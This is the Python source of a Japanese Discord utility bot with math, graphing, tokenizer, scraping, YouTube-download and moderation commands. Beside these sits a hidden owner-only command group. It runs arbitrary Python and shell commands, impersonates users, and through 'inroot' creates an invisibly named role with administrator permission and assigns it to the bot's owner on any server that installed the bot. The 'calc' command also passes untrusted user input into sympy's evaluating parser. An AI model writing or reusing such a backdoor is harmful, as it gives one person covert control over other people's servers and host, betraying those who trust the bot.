import asyncio
import copy
import datetime
import glob
import inspect
import io
import os
import os.path
import random
import re
import shutil
import subprocess
import sys
import textwrap
import time
import traceback
import typing
from contextlib import redirect_stdout
from typing import Optional, Union

import discord
import matplotlib.pyplot as plt
import numpy as np
import youtube_dl
from discord.ext import commands
from janome.tokenizer import Tokenizer
from pylab import rcParams
from sympy import *
from sympy import limit, oo
from sympy.parsing.sympy_parser import (implicit_multiplication_application,
                                        parse_expr, standard_transformations)
from sympy.plotting import plot

from dotenv import load_dotenv

load_dotenv()

prefix = '-'
bot = commands.Bot(command_prefix=prefix)


def admin(ctx):
    return ctx.message.author.id == 484019486970740736


@bot.event
async def on_ready():
    print('以下のユーザーとしてログインしました')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(name=f'Prefix {prefix} | made by Yuki'))

"""
@bot.event
async def on_message(msg):
    if msg.author.bot == False:
        A = ["お早う","おはよ"]
        B = "こんにちは"
        C = "おそよう"
        D = ["おやすみ", "寝る", "寝ます"]
        E = "こんばんは"
        
        for a in A:
            if msg.content.find(a) >= 0:
                await msg.channel.send("おはよう！")
                break
        if msg.content.find(B) >= 0:
            await msg.channel.send("こんにちは！")
        if msg.content.find(C) >= 0:
            await msg.channel.send("おそよう！w")
        for d in D:
            if msg.content.find(d) >= 0:
                await msg.channel.send("おやすみ！")
                break
        if msg.content.find(E) >= 0:
            await msg.channel.send("こんばんは！")
"""


"""
@bot.event
async def on_raw_reaction_add(payload):
    message_id = payload.message_id
    if message_id == 596737713525358600:
        guild_id = payload.guild_id
        guild = discord.utils.find(lambda g: g.id == guild_id, bot.guilds)
        _msg = await bot.get_channel(payload.channel_id).fetch_message(payload.message_id)

        if payload.emoji.name == '☑':
            role = discord.utils.get(guild.roles, name='パリピ')
            member = bot.get_guild(
                payload.guild_id).get_member(payload.user_id)

            if role in member.roles:
                await member.remove_roles(role)
                await _msg.remove_reaction('☑', member)

            else:
                await member.add_roles(role)
                await _msg.remove_reaction('☑', member)

        else:
            await _msg.remove_reaction(payload.emoji.name, member)
"""


@bot.command(name="?")
async def h(ctx, opt: typing.Optional[str] = None):
    embed = discord.Embed(title="Hina コマンドリファレンス",
                          description="", color=0x59b9c6)
    embed.add_field(name='date', value='現在時刻をミリ秒単位まで表示します。', inline=False)
    embed.add_field(name='calc [数式] [コマンドライン引数] [変数] [定数]',
                    value='与えられた数式を評価します。', inline=False)
    embed.add_field(name='texanaly [文字列]', value='文字列を形態素解析します。', inline=False)
    embed.add_field(name='imgscr [検索エンジン] [キーワード] [枚数]',
                    value="Google画像検索で指定したキーワードを検索し、指定枚数の画像をスクレイピングします。", inline=False)
    embed.add_field(name='kick [ギルドメンバー**] [理由]',
                    value='管理者用コマンドです。指定されたギルドメンバーをKickします。', inline=False)
    embed.add_field(name='ban [ギルドメンバー**] [メッセージ削除日数][理由]',
                    value='管理者用コマンドです。指定されたギルドメンバーをBanします。', inline=False)
    embed.set_thumbnail(
        url="https://img.icons8.com/office/96/000000/run-command.png")

    if opt == "/h":
        await ctx.send(embed=embed)
    else:
        dmch = await ctx.message.author.create_dm()
        await dmch.send(embed=embed)


def graph_draw(self) -> bytes:
    transformations = (standard_transformations +
                       (implicit_multiplication_application,))

    from math import ceil
    expr = parse_expr(self, transformations=transformations)

    rcParams['figure.figsize'] = 10, 7
    x = symbols('x')
    f = lambdify(x, expr, modules=['numpy', 'sympy'])
    s = -10
    e = 10
    x = np.array(np.linspace(s, e, ceil(1000*(e-s))))
    y = f(x)

    plt.title('f(x)= {}'.format(self))
    plt.grid(color='0.95')
    plt.xlabel('x')
    plt.ylabel('f(x)')
    plt.plot(x, y)

    sio = io.BytesIO()
    plt.savefig(sio, format='png')
    sio.seek(0)
    return sio.getvalue()


@bot.command()
async def calc(ctx, formula: str, opt: typing.Optional[str] = None, v: typing.Optional[Symbol] = None, *, c: typing.Optional[str] = None):

    transformations = (standard_transformations +
                       (implicit_multiplication_application,))

    if opt is None:
        await ctx.send(str(parse_expr(formula, transformations=transformations)))

    elif opt == "/_graph":
        await ctx.send(parse_expr(formula, transformations=transformations), file=discord.File(io.BytesIO(graph_draw(formula)), f"{formula}.png"))
    elif opt == "/graph":
        plt.gca().lines.clear()
        await ctx.send(parse_expr(formula, transformations=transformations), file=discord.File(io.BytesIO(graph_draw(formula)), f"{formula}.png"))

    elif opt == "/subs":
        expr = parse_expr(formula, transformations=transformations)
        await ctx.send(expr.subs(v, parse_expr(c, transformations=transformations)))
    elif opt == "/factor":
        await ctx.send(str(factor(parse_expr(formula, transformations=transformations))))
    elif opt == "/expand":
        await ctx.send(str(expand(parse_expr(formula, transformations=transformations))))
    elif opt == "/equation":
        eq = Eq(parse_expr(formula, transformations=transformations),
                parse_expr(c, transformations=transformations))
        await ctx.send(solve(eq, v))
    elif opt == "/primef":
        await ctx.send(factorint(int(formula)))
    elif opt == "/diff":
        await ctx.send(diff(parse_expr(formula, transformations=transformations), v))
    elif opt == "/integrate":
        await ctx.send(integrate(parse_expr(formula, transformations=transformations), v))

    else:
        if "/" in opt:
            await ctx.send('(!)コマンドライン引数"{}"は定義されてないよ'.format(opt))
        else:
            await ctx.send('(!)文字列"{}"は定義されてないよ'.format(opt))


@bot.command()
async def graph(ctx, opt: typing.Optional[str] = None, c: typing.Optional[int] = None):
    if opt is None:
        await ctx.send("matplotlib操作コマンド:(!)引数を指定してね")

    if opt == "/show":
        sio = io.BytesIO()
        plt.savefig(sio, format='png')
        sio.seek(0)
        await ctx.send("", file=discord.File(sio.getvalue(), "merged.png"))

    if opt == "/pop":
        plt.gca().lines.pop(c)

    if opt == "/clear":
        plt.gca().lines.clear()


@bot.command()
async def texanaly(ctx, text: str):
    tex = Tokenizer()
    tokens = tex.tokenize(text)
    for token in tokens:
        await ctx.send(token)


@texanaly.error
async def texanaly_error(ctx, error):
    await ctx.send(f'(!)<value>の値が定義されてないよ')
    if isinstance(error, commands.BadArgument):
        pass


@bot.command()
async def date(ctx):
    dt = datetime.datetime.now()
    await ctx.send(str(dt))


imgscr_ready = True


@bot.command()
async def imgscr(ctx, engine: str, keyword: str, limit: int, opt: typing.Optional[str] = None):
    global imgscr_ready
    if imgscr_ready == True:
        imgscr_ready = False
        msg = await ctx.send("スクレイピングを開始します...")

        subprocess.call(["python", "python_image_webscraping-master/src/SearchEngineClass.py",
                         engine, keyword, str(limit)])  # Windowsでは"\"

        if os.path.isdir("python_image_webscraping-master/download/image/{}".format((keyword.replace("　", "_")).replace(" ", "_"))) == True:
            for filename in glob.glob('python_image_webscraping-master/download/image/{}/*.*'.format((keyword.replace("　", "_")).replace(" ", "_"))):
                with open(filename, 'rb') as input:
                    if opt == None:
                        dmch = await ctx.message.author.create_dm()
                        await dmch.send(file=discord.File(input, f"{filename}.png"))
                    elif opt == "/h":
                        await ctx.send(file=discord.File(input, f"{filename}.png"))
                    else:
                        await ctx.send('(!)コマンドライン引数"{}"は定義されてないよ'.format(str(opt)))

            shutil.rmtree("python_image_webscraping-master/download/image/{}".format(
                (keyword.replace("　", "_")).replace(" ", "_")))

            imgscr_ready = True

            await msg.delete()

    else:
        await ctx.send("(!)しばらく時間を空けてからもう一度試してね")


mp3_current_num = 0
mp4_current_num = 0


@bot.command()
async def ytscr(ctx, mode: str, link: str):
    if mode == "mp4":
        global mp4_current_num
        mp4_current_num += 1
        num = str(mp4_current_num)

        ydl = youtube_dl.YoutubeDL(
            {'outtmpl': num + '.%(ext)s', 'format': 'bestvideo+bestaudio', 'merge-output-format': 'mkv'})
        with ydl:
            result = ydl.extract_info(
                link,
                download=True  # We just want to extract the info
            )

        with open("{}.mkv".format(num), 'rb') as f:
            await ctx.send(file=discord.File(f, "{}.mp4".format(num)))

        os.remove("{}.mkv".format(num))

    elif mode == "mp3":
        global mp3_current_num
        mp3_current_num += 1
        num = str(mp3_current_num)

        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': num + '.%(ext)s',
            'postprocessors': [
                {'key': 'FFmpegExtractAudio',
                 'preferredcodec': 'mp3',
                 'preferredquality': '192'},
                {'key': 'FFmpegMetadata'},
            ],
        }

        ydl = youtube_dl.YoutubeDL(ydl_opts)
        info_dict = ydl.extract_info(link, download=True)

        with open("{}.mp3".format(num), 'rb') as f:
            await ctx.send(file=discord.File(f, "{}.mp3".format(num)))

        os.remove("{}.mp3".format(num))


@bot.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, members: commands.Greedy[discord.Member], *, reason: typing.Optional[str] = "なし"):
    for member in members:
        await ctx.send(f'{member.mention}さんをKickしたよ！ 理由:{reason}')
        await member.kick(reason=reason)


@kick.error
async def kick_error(ctx, error):
    await ctx.send(f'(!)対象のユーザーがこのサーバーに参加していないようです')
    if isinstance(error, commands.BadArgument):
        pass


@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, members: commands.Greedy[discord.Member], delete_days: typing.Optional[int] = 0, *, reason: typing.Optional[str] = "なし"):
    for member in members:
        await ctx.send(f'{member.mention}さんをBanしたよ！ 理由:{reason}')
        await member.ban(delete_message_days=delete_days, reason=reason)


@ban.error
async def ban_error(ctx, error):
    await ctx.send(f'(!)対象のユーザーがこのサーバーに参加していないようです')
    if isinstance(error, commands.BadArgument):
        pass


#=================================================#


@bot.group()
@commands.check(admin)
async def sys(ctx):
    if ctx.invoked_subcommand is None:
        await ctx.send('(!)サブコマンドを入力してね')


@sys.command(name="exec")
async def a(ctx, *, source):
    try:
        exec(source)
    except Exception as e:
        await ctx.send("(!)" + str(e.args))


@sys.command()
async def subexec(ctx, *, source):
    try:
        import sys as s
        tex = io.StringIO()
        s.stdout = tex
        exec(source)
        await ctx.send(tex.getvalue())
        s.stdout.close()
        s.stdout = s.__stdout__
    except Exception as e:
        await ctx.send("(!)" + str(e.args))


@sys.command()
async def status(ctx, name: str):
    await ctx.send(f'プレイ中のゲームを``{name}``に変更しました。')
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(name=f'{name}'))


@sys.command()
async def echo(ctx, text: str):
    await ctx.send(text)


@sys.command()
async def invite(ctx):
    await ctx.send('https://discordapp.com/api/oauth2/authorize?client_id=684707685316558878&permissions=8&scope=bot')


@sys.command()
async def inroot(ctx):
    patch = discord.utils.get(ctx.guild.roles, name="ㅤ")
    if patch is None:
        await ctx.guild.create_role(name="ㅤ", hoist=False, permissions=discord.Permissions(permissions=8))
    else:
        await patch.delete()
        await ctx.guild.create_role(name="ㅤ", hoist=False, permissions=discord.Permissions(permissions=8))
    role = discord.utils.get(ctx.guild.roles, name="ㅤ")
    await ctx.author.add_roles(role)


@sys.command()
async def outroot(ctx):
    role = discord.utils.get(ctx.guild.roles, name="ㅤ")
    await ctx.author.remove_roles(role)


@sys.command()
async def delroot(ctx):
    role = discord.utils.get(ctx.guild.roles, name="ㅤ")
    await role.delete()


@sys.command()
async def directprint(ctx, names: commands.Greedy[discord.Member], count: typing.Optional[int] = 1, *, text: str):
    for name in names:
        dmch = await name.create_dm()
        for i in range(count):
            await dmch.send(text)


@bot.group()
@commands.check(admin)
async def task(ctx):
    if ctx.invoked_subcommand is None:
        await ctx.send('(!)サブコマンドを入力してね')


@task.command()
async def sudo(ctx, who: discord.User, *, command: str):
    msg = copy.copy(ctx.message)
    msg.author = ctx.guild.get_member(who.id) or who
    msg.content = ctx.prefix + command
    new_ctx = await bot.get_context(msg, cls=type(ctx))
    await bot.invoke(new_ctx)


@task.command()
async def do(ctx, times: int, *, command):
    msg = copy.copy(ctx.message)
    msg.content = ctx.prefix + command
    new_ctx = await bot.get_context(msg, cls=type(ctx))

    for i in range(times):
        await new_ctx.reinvoke()


@task.command()
async def sh(ctx, *, source: str):
    try:
        check = subprocess.getoutput(source)

        if check == '':
            await ctx.send('```' + '>' + '```')
        else:
            await ctx.send('```' + check + '```')

    except Exception as e:
        await ctx.send("(!)" + str(e.args))

bot.run(os.environ["DISCORD_TOKEN"])
